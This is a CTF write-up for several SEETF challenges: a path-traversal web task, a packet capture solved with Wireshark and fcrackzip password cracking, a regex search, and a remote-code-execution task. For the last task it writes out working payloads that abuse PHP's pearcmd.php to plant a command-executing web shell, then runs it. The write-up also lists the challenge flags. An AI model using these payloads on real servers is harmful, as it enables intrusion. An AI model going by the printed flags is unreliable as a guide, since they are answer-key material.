## Sourceless Guessy Web (Baby Flag)
>WHY SO SERIOUS? WHY NEED SOURCE?
Contrary to the title of this challenge, you do not need to guess. As usual, do not bruteforce or scan our infrastructure, it is not allowed.
Note: There are two flags for this challenge.
http://sourcelessguessyweb.chall.seetf.sg:1337
For beginners:
https://portswigger.net/web-security/file-path-traversal

![](https://i.imgur.com/t8jEC7j.png)
![](https://i.imgur.com/fk9gEtV.png)
![](https://i.imgur.com/TxfuzvH.png)

>SEE{2nd_fl4g_n33ds_RCE_g00d_luck_h4x0r}

---

# Sniffed Traffic
>We inspected our logs and found someone downloading a file from a machine within the same network.
Can you help find out what the contents of the file are?
For beginners:
    https://www.javatpoint.com/wireshark

![](https://i.imgur.com/F4FMLd6.png)

then export http object zip file
```
unzip thingamajig.zip 
    49949ec89a41ed9bdd18c4ce74f37ae4
binwalk --dd=".*" stuff
fcrackzip -u -D -p ../../rockyou.txt 3E8
    PASSWORD FOUND!!!!: pw == john
unzip 3E8
cat flag.txt 
    SEE{w1r35haRk_d0dod0_4c87be4cd5e37eb1e9a676e110fe59e3}

```
>SEE{w1r35haRk_d0dod0_4c87be4cd5e37eb1e9a676e110fe59e3}

---

## Regex101
>Our team stored a flag on our machine, however, we were hacked by someone, and he generated 2999 flags and hid our original flag in the .txt file. The flag consists of 5 uppercase letters, followed by 5 digits and another 6 uppercase letters. Can you find it for us?

SEE\{[A-Z]{5}\d{5}[A-Z]{6}\}

>SEE{RGSXG13841KLWIUO}

---

##  Sourceless Guessy Web (RCE Flag)
>WHY SO SERIOUS? WHY NEED SOURCE?
Contrary to the title of this challenge, you do not need to guess. As usual, do not bruteforce or scan our infrastructure, it is not allowed.
Note: There are two flags for this challenge.
http://sourcelessguessyweb.chall.seetf.sg:1337

after a lot of failures, HERES THE DEAL:

ref: 
https://twitter.com/phithon_xg/status/1455534506744717323 
https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html
 
```
view-source:http://sourcelessguessyweb.chall.seetf.sg:1337/?+config-create+/&page=../../../../../usr/local/lib/php/pearcmd.php&/%3C?=system(%27ls%27)?%3E+../../../../../tmp/hello.php

view-source:http://sourcelessguessyweb.chall.seetf.sg:1337/?page=../../../../../tmp/hello.php
```

![](https://i.imgur.com/Bo9x15b.png)
![](https://i.imgur.com/f8hIHWs.png)

so we tried to write a file with the command of 'ls' adn that worked so we moved to cmd
```
/?+config-create+/&page=../../../../../usr/local/lib/php/pearcmd.php&/<?=system($_GET['cmd'])?>+../../../../../tmp/cmd.php
```
then we visit:
```
/?page=../../../../tmp/cmd.php&cmd=ls
```

![](https://i.imgur.com/SKpsvGc.png)
![](https://i.imgur.com/weiH2RD.png)

>SEE{l0l_s0urc3_w0uldn't_h4v3_h3lp3d_th1s_1s_d3fault_PHP_d0cker}

---

